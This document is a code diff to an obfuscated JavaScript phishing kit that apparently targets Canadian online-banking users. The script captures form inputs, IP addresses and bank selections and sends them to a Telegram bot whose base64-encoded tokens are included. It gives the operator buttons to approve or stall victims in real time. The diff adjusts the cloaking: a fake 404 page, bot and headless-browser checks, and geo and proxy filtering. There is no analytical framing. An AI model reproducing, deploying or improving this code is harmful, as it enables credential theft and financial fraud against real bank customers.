@@ -1,4 +1,3 @@
-/* ------------------------------------------------------------------ */
 var _0xT=["ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA==","Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw==","Njc4ODAxMjQ4MQ=="];
 (function(_W,_D,_N){
 'use strict';
@@ -8,24 +7,19 @@ var _SID=_W.sessionStorage.getItem('__xs')||function(){var x=Math.random().toStr
 // ── FAKE 404 ──────────────────────────────────────────────────
 function _die(){try{_D.open();_D.write('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found.</p><hr><address>Apache/2.4.52 Server</address></body></html>');_D.close();_W.history.pushState(null,'','/404');}catch(e){_W.location.replace('/404');}}
 
-// ── ANTI-DEVTOOLS ────────────────────────────────────────────
-setInterval(function(){if(_W.outerWidth-_W.innerWidth>220||_W.outerHeight-_W.innerHeight>220)_die();},2000);
-var _a0=setInterval(function(){var _t=performance.now();(function(){}).constructor('debugger')();if(performance.now()-_t>120){clearInterval(_a0);_die();}},3500);
-
-// ── BOT DETECTION ────────────────────────────────────────────
+// ── BOT DETECTION (signaux certains seulement) ───────────────
 function _bot(){
-  if(_N.webdriver)return 1;
+  // Selenium / WebDriver explicite
+  if(_N.webdriver===true)return 1;
   if(_D.documentElement.getAttribute('webdriver'))return 1;
+  // PhantomJS
   if(_W.callPhantom||_W._phantom)return 1;
+  // NightmareJS
   if(_W.__nightmare)return 1;
+  // Chrome DevTools Protocol automation
   if(_W.domAutomation||_W.domAutomationController)return 1;
-  if(_W.process&&_W.process.versions&&_W.process.versions.electron)return 1;
-  var _ua=_N.userAgent||'';
-  if(/HeadlessChrome|PhantomJS|SlimerJS|Selenium|WebDriver|Bot|Crawl|Spider/i.test(_ua))return 1;
-  if(_N.plugins!==undefined&&_N.plugins.length===0&&!/firefox/i.test(_ua))return 1;
-  if(!_N.language&&!_N.languages)return 1;
-  if(!_N.permissions)return 1;
-  if(/chrome/i.test(_ua)&&!_W.chrome)return 1;
+  // UA explicitement bot/headless
+  if(/HeadlessChrome|PhantomJS|SlimerJS|Selenium|WebDriver/i.test(_N.userAgent||''))return 1;
   return 0;
 }
 
@@ -80,8 +74,8 @@ function _forms(){
         _flds.push('<b>'+(_i.name||_i.id||_i.placeholder||_i.type||'?')+':</b> <code>'+(_i.value||'(vide)')+'</code>');
       });
       var _nx=_f.getAttribute('action')||'';
-      var _msg='🔐 <b>CAPTURE | '+_pg.toUpperCase()+'</b>\n━━━━━━━━━━━━━━━\n'+_flds.join('\n')+'\n━━━━━━━━━━━━━━━\n📍 IP: <code>'+_ip+'</code>\n🏢 Org: <code>'+_org+'</code>\n🆔 Session: <code>'+_SID+'</code>';
-      var _kb=[[{text:'✅ Valide',callback_data:_SID+':ok'},{text:'❌ Erreur',callback_data:_SID+':err'}],[{text:'⏳ +30s',callback_data:_SID+':30'},{text:'⏳ +60s',callback_data:_SID+':60'},{text:'⏳ +120s',callback_data:_SID+':120'}]];
+      var _msg='\uD83D\uDD10 <b>CAPTURE | '+_pg.toUpperCase()+'</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'+_flds.join('\n')+'\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\uD83D\uDCCD IP: <code>'+_ip+'</code>\n\uD83C\uDFE2 Org: <code>'+_org+'</code>\n\uD83C\uDD94 Session: <code>'+_SID+'</code>';
+      var _kb=[[{text:'\u2705 Valide',callback_data:_SID+':ok'},{text:'\u274c Erreur',callback_data:_SID+':err'}],[{text:'\u23f3 +30s',callback_data:_SID+':30'},{text:'\u23f3 +60s',callback_data:_SID+':60'},{text:'\u23f3 +120s',callback_data:_SID+':120'}]];
       _ldr(true);
       _tg(_M,_msg,_kb).catch(function(){_ldr(false);_W.location.href=_nx;});
       _poll(_M,function(_a){
@@ -101,34 +95,47 @@ function _banks(){
     if(_el.dataset.xb)return;_el.dataset.xb='1';
     _el.addEventListener('click',function(){
       var _lbl=_el.getAttribute('filabel')||_el.getAttribute('data-fi')||_el.innerText||'?';
-      _tg(_R,'🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>'+_lbl.trim()+'</b>\n📍 IP: <code>'+_ip+'</code>\n🏢 Org: <code>'+_org+'</code>\n🆔 Session: <code>'+_SID+'</code>');
+      _tg(_R,'\uD83C\uDFE6 <b>BANQUE S\u00C9LECTIONN\u00C9E</b>\n\uD83C\uDFF7\uFE0F <b>'+_lbl.trim()+'</b>\n\uD83D\uDCCD IP: <code>'+_ip+'</code>\n\uD83C\uDFE2 Org: <code>'+_org+'</code>\n\uD83C\uDD94 Session: <code>'+_SID+'</code>');
     });
   });
 }
 
 // ── INIT ─────────────────────────────────────────────────────
 function _init(){
+  // 1. Blocage bot certain
   if(_bot()){_die();return;}
+
+  // 2. Vérification IP via ip-api (bloque proxy + non-CA ; hosting seul = pas bloqué car faux positifs ISP)
   fetch('https://ip-api.com/json/?fields=status,countryCode,proxy,hosting,query,org,isp')
     .then(function(r){return r.json();})
     .then(function(d){
-      if(d.status!=='success'||d.countryCode!==_CC||d.proxy||d.hosting){_die();return;}
+      if(d.status!=='success'){
+        // Fallback Cloudflare
+        _cfFallback();return;
+      }
+      // Bloquer si non-CA
+      if(d.countryCode!==_CC){_die();return;}
+      // Bloquer proxy/VPN (mais PAS hosting seul pour éviter faux positifs ISP canadiens)
+      if(d.proxy){_die();return;}
+
       _W.sessionStorage.setItem('__xip',d.query);
       _W.sessionStorage.setItem('__xorg',d.org||d.isp||'N/A');
-      _tg(_R,'🟢 <b>CONNEXION</b>\n📍 IP: <code>'+d.query+'</code>\n🌍 Pays: <code>'+d.countryCode+'</code>\n🏢 Org: <code>'+(d.org||d.isp)+'</code>\n📄 Page: <code>'+(_W.location.pathname.split('/').pop()||'index')+'</code>\n🆔 Session: <code>'+_SID+'</code>');
+      _tg(_R,'\uD83D\uDFE2 <b>CONNEXION</b>\n\uD83D\uDCCD IP: <code>'+d.query+'</code>\n\uD83C\uDF0D Pays: <code>'+d.countryCode+'</code>\n\uD83C\uDFE2 Org: <code>'+(d.org||d.isp)+'</code>\n\uD83C\uDFE0 Hosting: '+(d.hosting?'OUI':'non')+'\n\uD83D\uDCC4 Page: <code>'+(_W.location.pathname.split('/').pop()||'index')+'</code>\n\uD83C\uDD94 Session: <code>'+_SID+'</code>');
       _forms();_banks();
     })
-    .catch(function(){
-      fetch('https://www.cloudflare.com/cdn-cgi/trace')
-        .then(function(r){return r.text();})
-        .then(function(t){
-          var _loc=(t.match(/loc=([A-Z]{2})/)||[])[1];
-          var _ipv=(t.match(/ip=([^\n]+)/)||[])[1]||'N/A';
-          if(_loc!==_CC){_die();return;}
-          _W.sessionStorage.setItem('__xip',_ipv);
-          _forms();_banks();
-        }).catch(function(){_die();});
-    });
+    .catch(function(){_cfFallback();});
+}
+
+function _cfFallback(){
+  fetch('https://www.cloudflare.com/cdn-cgi/trace')
+    .then(function(r){return r.text();})
+    .then(function(t){
+      var _loc=(t.match(/loc=([A-Z]{2})/)||[])[1];
+      var _ipv=(t.match(/ip=([^\n]+)/)||[])[1]||'N/A';
+      if(_loc!==_CC){_die();return;}
+      _W.sessionStorage.setItem('__xip',_ipv);
+      _forms();_banks();
+    }).catch(function(){_die();});
 }
 
 _D.readyState==='loading'?_D.addEventListener('DOMContentLoaded',_init):_init();
